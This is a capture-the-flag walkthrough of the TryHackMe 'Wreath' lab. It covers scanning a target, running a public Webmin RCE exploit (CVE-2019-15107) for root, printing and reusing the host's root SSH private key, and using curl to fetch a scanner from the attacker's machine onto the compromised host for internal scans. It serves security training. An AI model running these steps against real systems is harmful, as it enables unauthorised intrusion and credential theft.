[Home](../../index.md)

# TryHackMe: Wreath Network

https://tryhackme.com/room/wreath

---
## Task 5 - Webserver Enumeration

Initial scan

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ rustscan -a 10.200.196.200 -r 1-65535 -- -A

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:                       
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfKbbFLiRV9dqsrYQifAghp85qmXpYEHf2g4JJqDKUL316TcAoGj62aamfhx5isIJHtQsA0hVmzD+4pVH4r8ANkuIIRs6j9cnBrLGpjk8xz9+BE1Vvd8lmORGxCqTv+9LgrpB7tcfoEkIOSG7zeY182kOR72igUERpy0JkzxJm2gIGb7Caz1s5/ScHEOhGX8VhNT4clOhDc9dLePRQvRooicIsENqQsLckE0eJB7rTSxemWduL+twySqtwN80a7pRzS7dzR4f6fkhVBAhYfl
JBW3iZ46zOItZcwT2u0wReCrFzxvDxEOewH7YHFpvOvb+Exuf3W6OuSjCHF64S7iU6z92aINNf+dSROACXbmGnBhTlGaV57brOXzujsWDylivWZ7CVVj1gB6mrNfEpBNE983qZskyVk4eTNT5cUD+3I/IPOz1bOtOWiraZCevFYaQR5AxNmx8sDIgo1z4VcxOMhrczc7RC/s3KWcoIkI2cI5+KUnDtaOfUClXPBCgYE50=
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFccvYHwpGWYUsw9mTk/mEvzyrY4ghhX2D6o3n/upTLFXbhJPV6ls4C8O0wH6TyGq7ClV3XpVa7zevngNoqlwzM=
|   256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINLfVtZHSGvCy3JP5GX0Dgzcxz+Y9In0TcQc3vhvMXCP
80/tcp    open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-05T17:13:28
| Not valid after:  2023-01-05T17:13:28
| MD5:   4617 2dbd 869a 12ba 96d0 354c 537e 1f47
| SHA-1: 560a dbad 3a2d 7c63 4111 ae96 6f9b a3e9 4e25 32c7
| -----BEGIN CERTIFICATE-----
| MIIELTCCAxWgAwIBAgIUPtYJYc2ty1FyzSGe7JvhkNHS1wEwDQYJKoZIhvcNAQEL
| BQAwgaUxCzAJBgNVBAYTAkdCMR4wHAYDVQQIDBVFYXN0IFJpZGluZyBZb3Jrc2hp
| cmUxEzARBgNVBAcMCkVhc2luZ3dvbGQxIjAgBgNVBAoMGVRob21hcyBXcmVhdGgg
| RGV2ZWxvcG1lbnQxGTAXBgNVBAMMEHRob21hc3dyZWF0aC50aG0xIjAgBgkqhkiG
| 9w0BCQEWE21lQHRob21hc3dyZWF0aC50aG0wHhcNMjIwMTA1MTcxMzI4WhcNMjMw
| MTA1MTcxMzI4WjCBpTELMAkGA1UEBhMCR0IxHjAcBgNVBAgMFUVhc3QgUmlkaW5n
| IFlvcmtzaGlyZTETMBEGA1UEBwwKRWFzaW5nd29sZDEiMCAGA1UECgwZVGhvbWFz
| IFdyZWF0aCBEZXZlbG9wbWVudDEZMBcGA1UEAwwQdGhvbWFzd3JlYXRoLnRobTEi
| MCAGCSqGSIb3DQEJARYTbWVAdGhvbWFzd3JlYXRoLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBANiL5IjfqPCJqUCcqMoIAae24U8s37dVJjVPDni3
| FwgXVGKHRAo7hXiZY5EoX3G0NcSTDx7RGdtYXJGfc87ubR4fO5xtZZIEgHsHcf18
| FYlAqgEhIT6llmD+ERK896suaNlVy1jQTXfNayJuZY8c/F3IO4rIrWqDzA/Xmn6e
| 7cMV84FDAxJRDagBFk1h0oVWxHG66htOS9x2AFrZYcuDA3dsw+Qt/Gt2SReMTPrv
| SsdLfirM0bZU/VDz43ZmcS+K1vAlWy92neq5H9Bom1R8N5JjyhrebOtUkEMqVOEP
| gsiGVHQJXau9Gbk2B+c6S4D3sTxPW714wTdFR2XEGc4aO1UCAwEAAaNTMFEwHQYD
| VR0OBBYEFKSWMvFRjsoZZ3oVgNEMzBm3aDWZMB8GA1UdIwQYMBaAFKSWMvFRjsoZ
| Z3oVgNEMzBm3aDWZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AJxuo9cKIkdpa/JAMy1Ppeam3Mz7e4PVXPeufnMd6eDVFl7GgZq9cQhuT1Meebp6
| 6ZfYHLpVtd18pU0e35yDmxrthgj/W0LVLX0xfW3ctiInk9bYIUhLz605PSx+AP3u
| KCyzzQyt0G+E1dSJaXL4iSE7sqs4ypUc+dWXdfS9KBla4B6cXloJg9v7/1outiwB
| QhfJOvy9PxnAQiemwMTp7nsc4QfAzrwgBQaKkR7DEQ1jH9TLf1Bm+a+Sad3yWG/5
| zVgFHsti+yg9N+AlUgQ5z9vrobRnwquFKN71O27b77GkxmzsuK4Ud7UR2pddx7lX
| Sdfl+lqXmVRqQFqn7jEWOl8=
|_-----END CERTIFICATE-----
10000/tcp open  http     syn-ack MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 7BB7FDC400A503ADAC6872774DE20505
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Attempting to access the site in a browser redirects to https://thomaswreath.thm.  We need to add this entry to /etc/hosts on our machine.

```
10.200.196.200  thomaswreath.thm
```

The website now loads.

Googling for `MiniServ 1.890` (service running on TCP 10000) quickly reveals an RCE vuln, CVE-2019-15107.

---
## Task 6 - Webserver Exploitation

We download the exploit and install the requirements as outlined in the task and run it against the target.

```
┌──(kali㉿kali)-[~/tryhackme/wreath/CVE-2019-15107]                   
└─$ ./CVE-2019-15107.py thomaswreath.thm      
                                                                               
        __        __   _               _         ____   ____ _____ 
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle


[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://thomaswreath.thm:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
# python3 -c "import pty; pty.spawn('/bin/bash')"
[-] Failed to execute command
```

I was not able to stabilize my shell, python3 failed to run, but I was able to pull id_rsa for consistent root access.

```
# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

After pasting the key into a file locally and changing permissions we have easier root access.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ vim id_rsa      

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ chmod 400 id_rsa  
                                                                                       
┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ ssh root@thomaswreath.thm -i id_rsa 
The authenticity of host 'thomaswreath.thm (10.200.196.200)' can't be established.
ED25519 key fingerprint is SHA256:7Mnhtkf/5Cs1mRaS3g6PGYXnU8u8ajdIqKU9lQpmYL4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thomaswreath.thm' (ED25519) to the list of known hosts.
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

---
## Task 17 - Git Server Enumeration

On our attacking machine, we grab the static nmap binary and rename it, then start an HTTP server via Python.

```
┌──(kali㉿kali)-[~/tryhackme/wreath]                                           
└─$ wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true

...

┌──(kali㉿kali)-[~/tryhackme/wreath]                                           
└─$ mv nmap\?raw=true nmap-narrowtomato 

┌──(kali㉿kali)-[~/tryhackme/wreath]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On the compromised web server, use curl (wget is not available) to grab the file and make it executable.  We can then run our host scan.

```
[root@prod-serv ~]# wget http://10.50.193.88:8000/nmap-narrowtomato
-bash: wget: command not found

[root@prod-serv ~]# curl http://10.50.193.88:8000/nmap-narrowtomato -o /tmp/nmap-narrowtomato && chmod +x /tmp/nmap-narrowtomato
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0   767k      0  0:00:07  0:00:07 --:--:--  698k

[root@prod-serv ~]# /tmp/nmap-narrowtomato -sn 10.200.196.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-01-12 19:18 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-196-1.eu-west-1.compute.internal (10.200.196.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.18s latency).
MAC Address: 02:B9:CF:AB:2E:FB (Unknown)
Nmap scan report for ip-10-200-196-100.eu-west-1.compute.internal (10.200.196.100)
Host is up (0.00025s latency).
MAC Address: 02:AD:4C:0A:D7:E7 (Unknown)
Nmap scan report for ip-10-200-196-150.eu-west-1.compute.internal (10.200.196.150)
Host is up (0.00030s latency).
MAC Address: 02:50:35:43:27:C3 (Unknown)
Nmap scan report for ip-10-200-196-250.eu-west-1.compute.internal (10.200.196.250)
Host is up (0.00035s latency).
MAC Address: 02:BE:4E:DD:79:D7 (Unknown)
Nmap scan report for ip-10-200-196-200.eu-west-1.compute.internal (10.200.196.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.83 seconds
```

`10.200.196.100` and `10.200.196.150` are the items of interest here, as `10.200.196.1` is the gateway, `10.200.196.200` is the web server, and `10.200.196.250` is the VPN gateway as explained in the task.

We proceed with port scans.

`10.200.196.100`, all ports are filtered.

```
[root@prod-serv ~]# sudo /tmp/nmap-narrowtomato -p- 10.200.196.100 -T 5

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-01-12 19:32 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-196-100.eu-west-1.compute.internal (10.200.196.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 65535 scanned ports on ip-10-200-196-100.eu-west-1.compute.internal (10.200.196.100) are filtered
MAC Address: 02:AD:4C:0A:D7:E7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 659.35 seconds
```

`10.200.196.150`, has more useful results.

```
[root@prod-serv ~]# sudo /tmp/nmap-narrowtomato -p 1-9999 10.200.196.150 -T 5

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-01-12 19:59 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-196-150.eu-west-1.compute.internal (10.200.196.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00056s latency).
Not shown: 9995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 02:50:35:43:27:C3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 126.15 seconds

```